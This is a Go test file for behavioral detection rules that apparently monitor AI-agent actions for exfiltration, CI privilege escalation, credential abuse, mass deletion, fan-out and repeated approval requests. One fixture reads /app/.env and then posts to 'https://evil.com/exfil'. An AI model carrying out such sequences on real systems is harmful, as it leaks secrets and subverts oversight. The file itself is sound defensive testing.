package behavioral

import (
	"testing"
	"time"

	"github.com/saivedant169/AegisFlow/internal/envelope"
)

func TestExfiltrationPattern_NoAlert(t *testing.T) {
	rule := ExfiltrationPattern{}
	now := time.Now().UTC()

	// Read non-sensitive, then POST -- should not trigger.
	history := []envelope.ActionEnvelope{
		*makeEnv("e1", "file.read", "/app/readme.md", envelope.CapRead, envelope.ProtocolShell, now),
		*makeEnv("e2", "http.post", "https://api.example.com", envelope.CapWrite, envelope.ProtocolHTTP, now.Add(time.Second)),
	}

	if alert := rule.Detect(history); alert != nil {
		t.Fatal("expected no alert for non-sensitive read + POST")
	}
}

func TestExfiltrationPattern_Triggered(t *testing.T) {
	rule := ExfiltrationPattern{}
	now := time.Now().UTC()

	history := []envelope.ActionEnvelope{
		*makeEnv("e1", "file.read", "/app/.env", envelope.CapRead, envelope.ProtocolShell, now),
		*makeEnv("e2", "http.post", "https://evil.com/exfil", envelope.CapWrite, envelope.ProtocolHTTP, now.Add(time.Second)),
	}

	alert := rule.Detect(history)
	if alert == nil {
		t.Fatal("expected exfiltration alert")
	}
	if alert.Severity != "critical" {
		t.Errorf("expected critical severity, got %s", alert.Severity)
	}
}

func TestPrivilegeEscalation_NoAlert(t *testing.T) {
	rule := PrivilegeEscalation{}
	now := time.Now().UTC()

	// Write to normal file + deploy -- no CI edit.
	history := []envelope.ActionEnvelope{
		*makeEnv("e1", "file.write", "/app/main.go", envelope.CapWrite, envelope.ProtocolShell, now),
		*makeEnv("e2", "deploy.run", "production", envelope.CapDeploy, envelope.ProtocolHTTP, now.Add(time.Second)),
	}

	if alert := rule.Detect(history); alert != nil {
		t.Fatal("expected no alert when CI files are not edited")
	}
}

func TestPrivilegeEscalation_Triggered(t *testing.T) {
	rule := PrivilegeEscalation{}
	now := time.Now().UTC()

	history := []envelope.ActionEnvelope{
		*makeEnv("e1", "file.write", ".github/workflows/deploy.yaml", envelope.CapWrite, envelope.ProtocolGit, now),
		*makeEnv("e2", "git.push", "origin/main", envelope.CapDeploy, envelope.ProtocolGit, now.Add(time.Second)),
	}

	alert := rule.Detect(history)
	if alert == nil {
		t.Fatal("expected privilege_escalation alert")
	}
	if alert.RiskScore != 35 {
		t.Errorf("expected risk score 35, got %d", alert.RiskScore)
	}
}

func TestCredentialAbuse_NeedsTwoExternalCalls(t *testing.T) {
	rule := CredentialAbuse{}
	now := time.Now().UTC()

	// Read secret via shell + only 1 external call -- not enough.
	history := []envelope.ActionEnvelope{
		*makeEnv("e1", "file.read", "secret/api", envelope.CapRead, envelope.ProtocolShell, now),
		*makeEnv("e2", "http.get", "https://api.com", envelope.CapRead, envelope.ProtocolHTTP, now.Add(time.Second)),
	}

	if alert := rule.Detect(history); alert != nil {
		t.Fatal("expected no alert with only 1 external call")
	}
}

func TestCredentialAbuse_Triggered(t *testing.T) {
	rule := CredentialAbuse{}
	now := time.Now().UTC()

	history := []envelope.ActionEnvelope{
		*makeEnv("e1", "vault.read", "secret/api", envelope.CapRead, envelope.ProtocolHTTP, now),
		*makeEnv("e2", "http.get", "https://a.com", envelope.CapRead, envelope.ProtocolHTTP, now.Add(time.Second)),
		*makeEnv("e3", "http.post", "https://b.com", envelope.CapWrite, envelope.ProtocolHTTP, now.Add(2*time.Second)),
	}

	alert := rule.Detect(history)
	if alert == nil {
		t.Fatal("expected credential_abuse alert")
	}
	if alert.Severity != "critical" {
		t.Errorf("expected critical severity, got %s", alert.Severity)
	}
}

func TestDestructiveSequence_TwoDeletesNotEnough(t *testing.T) {
	rule := DestructiveSequence{}
	now := time.Now().UTC()

	history := []envelope.ActionEnvelope{
		*makeEnv("e1", "file.delete", "/a", envelope.CapDelete, envelope.ProtocolShell, now),
		*makeEnv("e2", "file.delete", "/b", envelope.CapDelete, envelope.ProtocolShell, now.Add(time.Second)),
	}

	if alert := rule.Detect(history); alert != nil {
		t.Fatal("expected no alert for 2 consecutive deletes")
	}
}

func TestDestructiveSequence_ThreeDeletes(t *testing.T) {
	rule := DestructiveSequence{}
	now := time.Now().UTC()

	history := []envelope.ActionEnvelope{
		*makeEnv("e1", "file.delete", "/a", envelope.CapDelete, envelope.ProtocolShell, now),
		*makeEnv("e2", "file.delete", "/b", envelope.CapDelete, envelope.ProtocolShell, now.Add(time.Second)),
		*makeEnv("e3", "file.delete", "/c", envelope.CapDelete, envelope.ProtocolShell, now.Add(2*time.Second)),
	}

	alert := rule.Detect(history)
	if alert == nil {
		t.Fatal("expected destructive_sequence alert")
	}
	if len(alert.Actions) != 3 {
		t.Errorf("expected 3 actions, got %d", len(alert.Actions))
	}
}

func TestDestructiveSequence_InterruptedDoesNotTrigger(t *testing.T) {
	rule := DestructiveSequence{}
	now := time.Now().UTC()

	history := []envelope.ActionEnvelope{
		*makeEnv("e1", "file.delete", "/a", envelope.CapDelete, envelope.ProtocolShell, now),
		*makeEnv("e2", "file.read", "/b", envelope.CapRead, envelope.ProtocolShell, now.Add(time.Second)),
		*makeEnv("e3", "file.delete", "/c", envelope.CapDelete, envelope.ProtocolShell, now.Add(2*time.Second)),
		*makeEnv("e4", "file.delete", "/d", envelope.CapDelete, envelope.ProtocolShell, now.Add(3*time.Second)),
	}

	if alert := rule.Detect(history); alert != nil {
		t.Fatal("expected no alert when deletes are interrupted by non-delete action")
	}
}

func TestSuspiciousFanOut_BelowThreshold(t *testing.T) {
	rule := SuspiciousFanOut{}
	now := time.Now().UTC()

	// Only 5 distinct targets -- below default threshold of 10.
	var history []envelope.ActionEnvelope
	for i := 0; i < 5; i++ {
		target := "host-" + string(rune('a'+i)) + ".example.com"
		history = append(history, *makeEnv("e"+string(rune('0'+i)), "http.get", target, envelope.CapRead, envelope.ProtocolHTTP, now.Add(time.Duration(i)*time.Second)))
	}

	if alert := rule.Detect(history); alert != nil {
		t.Fatal("expected no alert for 5 targets")
	}
}

func TestSuspiciousFanOut_Triggered(t *testing.T) {
	rule := SuspiciousFanOut{MaxTargets: 5, WindowSeconds: 60}
	now := time.Now().UTC()

	var history []envelope.ActionEnvelope
	for i := 0; i < 5; i++ {
		target := "host-" + string(rune('a'+i)) + ".example.com"
		history = append(history, *makeEnv("e"+string(rune('0'+i)), "http.get", target, envelope.CapRead, envelope.ProtocolHTTP, now.Add(time.Duration(i)*time.Second)))
	}

	alert := rule.Detect(history)
	if alert == nil {
		t.Fatal("expected suspicious_fan_out alert")
	}
}

func TestRepeatedEscalation_NoAlert(t *testing.T) {
	rule := RepeatedEscalation{}
	now := time.Now().UTC()

	// Only 2 approval requests -- below default threshold of 3.
	history := []envelope.ActionEnvelope{
		*makeEnv("e1", "approval.request", "/deploy", envelope.CapApprove, envelope.ProtocolHTTP, now),
		*makeEnv("e2", "approval.request", "/deploy2", envelope.CapApprove, envelope.ProtocolHTTP, now.Add(time.Second)),
	}

	if alert := rule.Detect(history); alert != nil {
		t.Fatal("expected no alert for 2 escalation requests")
	}
}

func TestRepeatedEscalation_Triggered(t *testing.T) {
	rule := RepeatedEscalation{MaxRequests: 3, WindowSeconds: 60}
	now := time.Now().UTC()

	history := []envelope.ActionEnvelope{
		*makeEnv("e1", "approval.request", "/deploy", envelope.CapApprove, envelope.ProtocolHTTP, now),
		*makeEnv("e2", "approval.request", "/deploy2", envelope.CapApprove, envelope.ProtocolHTTP, now.Add(time.Second)),
		*makeEnv("e3", "approval.request", "/deploy3", envelope.CapApprove, envelope.ProtocolHTTP, now.Add(2*time.Second)),
	}

	alert := rule.Detect(history)
	if alert == nil {
		t.Fatal("expected repeated_escalation alert")
	}
	if len(alert.Actions) != 3 {
		t.Errorf("expected 3 actions, got %d", len(alert.Actions))
	}
}

func TestRepeatedEscalation_OutsideWindow(t *testing.T) {
	rule := RepeatedEscalation{MaxRequests: 3, WindowSeconds: 10}
	now := time.Now().UTC()

	// 3 requests but spread over 30 seconds -- outside 10s window.
	history := []envelope.ActionEnvelope{
		*makeEnv("e1", "approval.request", "/deploy", envelope.CapApprove, envelope.ProtocolHTTP, now),
		*makeEnv("e2", "approval.request", "/deploy2", envelope.CapApprove, envelope.ProtocolHTTP, now.Add(15*time.Second)),
		*makeEnv("e3", "approval.request", "/deploy3", envelope.CapApprove, envelope.ProtocolHTTP, now.Add(30*time.Second)),
	}

	if alert := rule.Detect(history); alert != nil {
		t.Fatal("expected no alert when requests are outside time window")
	}
}
